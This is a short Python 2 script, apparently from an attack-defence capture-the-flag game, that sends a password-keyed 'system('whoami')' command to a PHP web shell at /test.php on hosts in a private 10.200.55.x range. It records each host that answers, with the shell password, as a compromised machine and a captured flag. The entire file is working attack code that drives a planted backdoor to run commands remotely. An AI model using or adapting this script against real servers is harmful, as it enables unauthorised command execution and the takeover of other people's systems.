#coding=utf-8
import requests
url = "http://10.200.55."
url1 = ""
shell = "/test.php"
passwd = "sinvana"
port = "8081"
payload = {passwd: 'system(\'whoami\');'}
f = open("webshell_list.txt","w")
f1 = open("first_round_flag.txt","w")
for i in [79]:
	url1 = url + str(i) +':'+ port + shell
	try:
		r = requests.post(url1,payload,timeout=1)
		if r.status_code == 200:
			print url1 + "connect shell success,flag is " + r.text
			print >>f1,url1 + "connect shell success,flag is "+ r.text
			print >>f,url1+","+passwd
		else:
			print "shell 404"
	except:
		print url1+" connect shell fail"

f.close()
f1.close()
